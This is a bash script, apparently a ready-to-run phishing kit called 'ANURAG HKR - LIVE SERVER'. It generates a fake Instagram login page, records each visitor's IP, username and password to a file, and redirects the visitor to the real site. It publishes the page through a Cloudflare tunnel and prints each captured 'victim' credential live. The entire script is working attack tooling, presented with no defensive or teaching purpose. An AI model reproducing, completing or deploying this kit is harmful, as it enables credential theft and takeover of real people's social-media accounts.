#!/bin/bash

# --- 1. SETUP & COLORS ---
clear
R='\033[1;31m'
G='\033[1;32m'
C='\033[1;36m'
Y='\033[1;33m'
RESET='\033[0m'

# Cleanup
pkill -f php > /dev/null 2>&1
pkill -f cloudflared > /dev/null 2>&1
rm -rf auth/
mkdir -p auth
touch usernames.txt

# --- 2. HEADER ---
echo -e "${C}=========================================${RESET}"
echo -e "${Y}      ANURAG HKR - LIVE SERVER (PRO)     ${RESET}"
echo -e "${C}=========================================${RESET}"
echo ""

# --- 3. AUTO-INSTALL CLOUDFLARED (The Engine) ---
if [ ! -f "cloudflared" ]; then
    echo -e "${Y}[*] Downloading Cloudflare Engine...${RESET}"
    
    # Check Architecture (Android vs PC)
    ARCH=$(uname -m)
    if [[ "$ARCH" == *"aarch64"* || "$ARCH" == *"arm64"* ]]; then
        wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
    elif [[ "$ARCH" == *"x86_64"* ]]; then
        wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
    else
        wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared
    fi
    
    chmod +x cloudflared
    echo -e "${G}[✔] Engine Installed!${RESET}"
    sleep 1
fi

# --- 4. CREATE INSTAGRAM HTML (Mobile Optimized) ---
cat > auth/index.php <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
*{ margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
body{ background:#0b1116; color:#fff; }
.main{ display:flex; min-height:100vh; }
.left{ width:50%; padding:60px; background:linear-gradient(160deg,#000,#0b1116); display:flex; flex-direction:column; justify-content:center; }
.left img.logo{ width:55px; margin-bottom:40px; }
.left h1{ font-size:40px; font-weight:400; line-height:1.3; }
.left h1 span{ color:#ff2d55; }
.left .story{ margin-top:40px; width:280px; }
.right{ width:50%; background:#121e26; display:flex; justify-content:center; align-items:center; }
.card{ width:380px; padding: 20px; }
.card h2{ font-size:20px; margin-bottom:20px; text-align: center; }
.input{ width:100%; padding:14px; margin-bottom:12px; border-radius:12px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; outline:none; }
.btn{ width:100%; padding:14px; border:none; border-radius:30px; background:#0095f6; color:#fff; font-size:15px; cursor:pointer; margin-top:5px; font-weight:bold; }
.link{ text-align:center; margin:18px 0; font-size:14px; color:#cfd8dc; cursor: pointer; }
.fb{ width:100%; padding:12px; border-radius:30px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; margin-bottom:12px; cursor: pointer; }
.new{ width:100%; padding:12px; border-radius:30px; border:1px solid #3b82f6; background:transparent; color:#3b82f6; cursor: pointer; }
.meta{ text-align:center; margin-top:25px; opacity:.7; font-size: 12px; }
@media(max-width:900px){
    .main{ flex-direction:column; }
    .left{ display:none; } 
    .right{ width:100%; height:100vh; background:#000; align-items: center; }
    .card{ width: 100%; max-width: 350px; background: transparent; }
}
</style>
</head>
<body>
<div class="main">
    <div class="left">
        <img class="logo" src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png">
        <h1>See everyday moments from <br> your <span>close friends.</span></h1>
        <img class="story" src="https://static.cdninstagram.com/rsrc.php/v4/yF/r/reN9rvYdLTB.png">
    </div>
    <div class="right">
        <div class="card">
            <h2 style="font-family: sans-serif;">Instagram</h2>
            <form action="login.php" method="POST">
                <input class="input" type="text" name="username" placeholder="Mobile number, username or email address" required>
                <input class="input" type="password" name="password" placeholder="Password" required>
                <button class="btn" type="submit">Log in</button>
            </form>
            <div class="link">Forgotten password?</div>
            <button class="fb">Log in with Facebook</button>
            <button class="new">Create new account</button>
            <div class="meta">From<br>Meta</div>
        </div>
    </div>
</div>
</body>
</html>
EOF

cat > auth/login.php <<EOF
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
\$user = \$_POST['username'];
\$pass = \$_POST['password'];
\$log = "\$ip|\$user|\$pass\n";
file_put_contents("../usernames.txt", \$log, FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
EOF

# --- 5. START SERVERS ---
echo -e "${Y}[*] Starting PHP Server (Localhost)...${RESET}"
# PHP Localhost par chalega (Port 8080)
php -S 127.0.0.1:8080 -t auth > /dev/null 2>&1 &
PID=$!
sleep 2

echo -e "${Y}[*] Launching Cloudflare Tunnel...${RESET}"
# Cloudflared us local port ko internet par bhejega
./cloudflared tunnel -url http://127.0.0.1:8080 --logfile cloud.log > /dev/null 2>&1 &
sleep 5

# --- 6. EXTRACT & DISPLAY URL ---
echo -e "${C}[*] Generating Live Link...${RESET}"
sleep 3
LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)

if [[ -z "$LINK" ]]; then
    echo -e "${R}[!] Link Generation Failed! Retrying...${RESET}"
    sleep 3
    LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)
fi

if [[ ! -z "$LINK" ]]; then
    echo -e "${G}=========================================${RESET}"
    echo -e "${Y}   LIVE URL: ${G}$LINK ${RESET}"
    echo -e "${G}=========================================${RESET}"
    echo -e "${R}[-] Waiting for Login... (Ctrl+C to Stop)${RESET}"
    echo ""
    
    # --- 7. MONITORING LOOP ---
    tail -n 0 -f usernames.txt | while IFS='|' read -r ip user pass; do
        if [[ ! -z "$ip" ]]; then
            echo -e "${R}[-] Victim Found !${RESET}"
            echo -e "${G}[-] IP       : $ip${RESET}"
            echo -e "${Y}[-] Username : $user${RESET}"
            echo -e "${C}[-] Password : $pass${RESET}"
            echo -e "----------------------------------------"
            echo -e "\a"
        fi
    done
else
    echo -e "${R}[!] Cloudflare Error. Check Internet or 'cloud.log' file.${RESET}"
    cat cloud.log
    killall php > /dev/null 2>&1
    killall cloudflared > /dev/null 2>&1
fi
